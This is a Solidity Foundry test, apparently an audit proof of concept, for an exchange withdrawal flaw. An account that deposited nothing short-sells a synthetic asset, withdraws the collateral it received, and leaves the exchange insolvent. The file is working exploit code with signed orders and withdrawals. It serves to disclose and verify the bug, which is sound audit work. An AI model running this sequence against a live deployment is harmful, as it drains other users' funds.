// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

// HOW TO RUN (test/ is out of scope so a temp copy there is fine):
//   cd <audit>/repo
//   sed -e 's#../script/Deploy.s.sol#../script/Deploy.s.sol#' \
//       -e 's#./mocks/MockERC20Permit.sol#./mocks/MockERC20Permit.sol#' \
//       -e 's#../src/#../src/#g' \
//       ../pocs/LC1_spot_short_withdraw_insolvency.t.sol > test/LC1_audit.t.sol
//   forge test --match-contract LC1SpotInsolvency -vv ; rm test/LC1_audit.t.sol
// RESULT: attacker deposits 0, short-sells synthetic for 900 collateral, withdraws
// 900 real tokens; system token balance 1000→100 while honest A's claim is 999 → INSOLVENT.

import "forge-std/Test.sol";
import "../script/Deploy.s.sol";
import "./mocks/MockERC20Permit.sol";

import "../src/core/balance/transactions/DepositTransLib.sol";
import "../src/core/balance/transactions/WithdrawalTransLib.sol";
import "../src/orderbook/LimitOrder.sol";
import "../src/orderbook/LimitOrderLib.sol";
import "../src/orderbook/transactions/TradeTransLib.sol";

/// @title LC1 — Spot short-seller withdraws minted collateral → exchange insolvency
/// @notice Demonstrates LEAD-L-1 / INV-SOLVENCY / SPEC-1/5/7.
///
/// In a spot (or predict) deployment:
///   - TRADE routes position changes through NullMarginCheck (no-op).
///   - WITHDRAWAL is gated only by BasicBalanceCheck, which checks
///     `bucket-0 collateral >= amount` and IGNORES the value of negative
///     (short) synthetic positions.
///
/// A user (party B) who sells synthetic to a counterparty (party A) ends up
/// holding the buyer's collateral PLUS an unbacked short. BasicBalanceCheck
/// lets B withdraw the full collateral because it never accounts for the
/// short liability. B extracts real tokens it never funded; the system is
/// left insolvent (LoadingZone systemBalance < sum of positive account
/// collateral that remains claimable).
contract LC1SpotInsolvency is Test, DeployScript {
    using LimitOrderLib for LimitOrder;

    uint256 internal constant PK_A = 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80;
    uint256 internal constant PK_B = 0x2a871d0798f97d79848a013d4936a73bf4cc922c825d33c1cf7073dff6d409c6;

    uint64 internal constant UID_A = 1; // honest buyer
    uint64 internal constant UID_B = 2; // attacker / short seller
    uint64 internal constant FEE_UID = 100_000;
    uint64 internal constant COLLATERAL_ASSET_ID = 1;
    uint64 internal constant SYNTH_ASSET_ID = 2;

    Addresses internal addrs;
    address internal deployerA;
    address internal ownerB;
    address internal feeOwner;
    MockERC20Permit internal testToken;

    function setUp() public {
        deployerA = vm.addr(PK_A);
        ownerB = vm.addr(PK_B);
        feeOwner = makeAddr("feeOwner");

        vm.startPrank(deployerA);
        addrs = _deployContracts(Profile.Spot, deployerA);
        _wireContracts(addrs, Profile.Spot, deployerA);
        testToken = MockERC20Permit(addrs.depositToken);

        GeneralConfig gc = GeneralConfig(addrs.generalConfig);
        gc.setAssetAdmin(deployerA);
        gc.setCollateralAssetInfo(CollateralAssetInfo({assetId: COLLATERAL_ASSET_ID, resolution: 1}));
        gc.setFeeAccountId(FEE_UID);
        _registerSyntheticAsset();

        AccountManager am = AccountManager(addrs.accountManager);
        am.registerAccount(UID_B, ownerB);
        am.registerAccount(FEE_UID, feeOwner);

        SignerManager sm = SignerManager(addrs.signerManager);
        sm.addSignerWithPermissions(UID_A, deployerA, 0);
        sm.addSignerWithPermissions(UID_B, ownerB, 0);
        sm.addSignerWithPermissions(FEE_UID, feeOwner, 0);
        vm.stopPrank();
    }

    function testShortSellerDrainsViaWithdraw() public {
        // ---- Honest buyer A funds the exchange with 1000 tokens. ----
        _primeLoadingZone(deployerA, 1_000);
        _processDeposit(UID_A, 1_000);

        // ---- Attacker B deposits NOTHING (0 collateral). ----
        // B will obtain collateral purely by short-selling synthetic to A.
        assertEq(AccountManager(addrs.accountManager).getCollateralPositionBalance(UID_B, 0), 0, "B starts with 0");

        // Confirm spot stack: margin check has NO provider (NullMarginCheck).
        assertEq(
            TransactionProcessor(addrs.transactionProcessor).capabilityProvider(CAP_MARGIN_CHECK),
            address(0),
            "spot: no margin provider"
        );

        uint256 systemBefore = LoadingZone(addrs.loadingZone).systemBalance();
        assertEq(systemBefore, 1_000, "system holds exactly A's 1000 tokens");

        // ---- A buys 100 synthetic from B for 900 collateral (price ~9). ----
        // Both orders are genuinely user-signed; an honest sequencer relays them.
        int256 synth = 100;
        int256 collat = 900;
        Trade memory trade = _buildTrade(synth, collat);

        vm.prank(addrs.multiTransactionProcessor);
        TransactionProcessor(addrs.transactionProcessor).processTransaction(TYPE_TRADE, abi.encode(trade));

        // Post-trade state:
        //  A: +100 synthetic, collateral 1000 - 900 - fee
        //  B: -100 synthetic (short, unbacked), collateral 0 + 900 - fee
        int256 bCollat = AccountManager(addrs.accountManager).getCollateralPositionBalance(UID_B, 0);
        int256 bSynth = PositionManager(addrs.positionManager).getSyntheticBalance(UID_B, SYNTH_ASSET_ID);
        emit log_named_int("B collateral after trade", bCollat);
        emit log_named_int("B synthetic after trade (short liability)", bSynth);
        assertEq(bSynth, -100, "B is short 100 synthetic with no collateral backing it");
        assertGt(bCollat, 0, "B now holds collateral it never deposited");

        // ---- Attacker B withdraws the full minted collateral to its own EOA. ----
        // BasicBalanceCheck only checks bucket-0 collateral >= amount; it does
        // NOT subtract the -100 synthetic liability → the withdrawal PASSES.
        address attackerEOA = makeAddr("attackerEOA");
        uint256 evilWithdraw = uint256(bCollat);

        Withdrawal memory w = _signedWithdrawal(UID_B, attackerEOA, int256(evilWithdraw), 1, PK_B);
        vm.prank(addrs.multiTransactionProcessor);
        TransactionProcessor(addrs.transactionProcessor).processTransaction(TYPE_WITHDRAWAL, abi.encode(w));

        // ---- Result: attacker extracted real tokens it never funded. ----
        assertEq(testToken.balanceOf(attackerEOA), evilWithdraw, "attacker received real ERC20 tokens");

        // B's account is now: 0 collateral, -100 synthetic. A negative-value,
        // fully-unbacked position remains in the system.
        assertEq(
            AccountManager(addrs.accountManager).getCollateralPositionBalance(UID_B, 0), 0, "B collateral drained to 0"
        );
        assertEq(
            PositionManager(addrs.positionManager).getSyntheticBalance(UID_B, SYNTH_ASSET_ID),
            -100,
            "B keeps the unbacked short"
        );

        // ---- Solvency is broken. ----
        // A still legitimately holds +100 synthetic worth ~900 collateral and
        // remaining bucket-0 collateral, but the system token balance can no
        // longer cover everyone: B walked away with `evilWithdraw` it never put in.
        uint256 systemAfter = LoadingZone(addrs.loadingZone).systemBalance();
        emit log_named_uint("system token balance before", systemBefore);
        emit log_named_uint("system token balance after", systemAfter);
        emit log_named_uint("tokens extracted by attacker (never deposited)", evilWithdraw);

        // The exchange now holds (1000 - evilWithdraw) tokens, but A's legitimate
        // claim (collateral + value of +100 synthetic at the trade price) exceeds
        // that. The deficit equals exactly the attacker's unfunded extraction.
        int256 aCollat = AccountManager(addrs.accountManager).getCollateralPositionBalance(UID_A, 0);
        int256 aSynth = PositionManager(addrs.positionManager).getSyntheticBalance(UID_A, SYNTH_ASSET_ID);
        // A's mark-to-trade claim on collateral if A closed at the same price:
        int256 aClaim = aCollat + (aSynth * collat) / synth; // collateral + synthetic*price
        emit log_named_int("A redeemable claim (collateral + synthetic value)", aClaim);
        emit log_named_uint("system tokens remaining", systemAfter);

        assertGt(
            uint256(aClaim),
            systemAfter,
            "INSOLVENT: A's legitimate claim exceeds the tokens left in the exchange"
        );
    }

    // ───────────────────────── helpers ─────────────────────────

    function _registerSyntheticAsset() internal {
        RiskFactorSegment[] memory rfs = new RiskFactorSegment[](1);
        rfs[0] = RiskFactorSegment({upperBound: 1_000_000, risk: 1 << 32});
        uint64[] memory oracleAssetIds = new uint64[](1);
        oracleAssetIds[0] = SYNTH_ASSET_ID;
        address[] memory signers = new address[](1);
        signers[0] = deployerA;
        SyntheticAssetInfo[] memory infos = new SyntheticAssetInfo[](1);
        infos[0] = SyntheticAssetInfo({
            resolution: 1,
            riskFactorSegments: rfs,
            oraclePriceSignedAssetIds: oracleAssetIds,
            oraclePriceQuorum: 1,
            oraclePriceSigners: signers,
            maxFundingRate: 2 * (int256(1) << 32)
        });
        uint64[] memory ids = new uint64[](1);
        ids[0] = SYNTH_ASSET_ID;
        GeneralConfig(addrs.generalConfig).setSyntheticAssetsInfo(ids, infos);
    }

    function _primeLoadingZone(address user, uint256 amount) internal {
        vm.startPrank(user);
        testToken.approve(addrs.loadingZone, amount);
        LoadingZone(addrs.loadingZone).deposit(amount);
        vm.stopPrank();
    }

    function _processDeposit(uint64 accountId, int256 amount) internal {
        Deposit memory d = Deposit({accountId: accountId, amount: amount});
        vm.prank(addrs.multiTransactionProcessor);
        TransactionProcessor(addrs.transactionProcessor).processTransaction(TYPE_DEPOSIT, abi.encode(d));
    }

    function _signedWithdrawal(uint64 from, address to, int256 amount, uint256 nonce, uint256 pk)
        internal
        view
        returns (Withdrawal memory)
    {
        Withdrawal memory w = Withdrawal({from: from, toAddress: to, amount: amount, nonce: nonce, signature: ""});
        bytes32 mh = WithdrawalTransLib.getWithdrawalHash(w, block.chainid, addrs.transactionProcessor);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(pk, mh);
        w.signature = abi.encodePacked(r, s, v);
        return w;
    }

    function _signedOrder(
        uint64 accountId,
        address signer,
        uint256 pk,
        int256 amountSynthetic,
        int256 amountCollateral,
        bool isBuyingSynthetic
    ) internal view returns (LimitOrder memory) {
        OrderBase memory base = OrderBase({
            nonce: uint256(uint160(signer)),
            signer: signer,
            accountId: accountId,
            expirationTimestamp: type(int256).max / 2,
            signature: ""
        });
        LimitOrder memory o = LimitOrder({
            base: base,
            amountSynthetic: amountSynthetic,
            amountCollateral: amountCollateral,
            amountFee: 1,
            assetIdSynthetic: SYNTH_ASSET_ID,
            assetIdCollateral: COLLATERAL_ASSET_ID,
            isBuyingSynthetic: isBuyingSynthetic,
            orderHash: ""
        });
        o.orderHash = o.getOrderHash(block.chainid, addrs.transactionProcessor);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(pk, o.orderHash);
        o.base.signature = abi.encodePacked(r, s, v);
        return o;
    }

    function _buildTrade(int256 amountSynthetic, int256 amountCollateral) internal view returns (Trade memory) {
        // A buys, B sells.
        LimitOrder memory aOrder = _signedOrder(UID_A, deployerA, PK_A, amountSynthetic, amountCollateral, true);
        LimitOrder memory bOrder = _signedOrder(UID_B, ownerB, PK_B, amountSynthetic, amountCollateral, false);
        return Trade({
            partyAOrder: aOrder,
            partyBOrder: bOrder,
            actualCollateral: amountCollateral,
            actualSynthetic: amountSynthetic,
            actualAFee: 1,
            actualBFee: 0
        });
    }
}
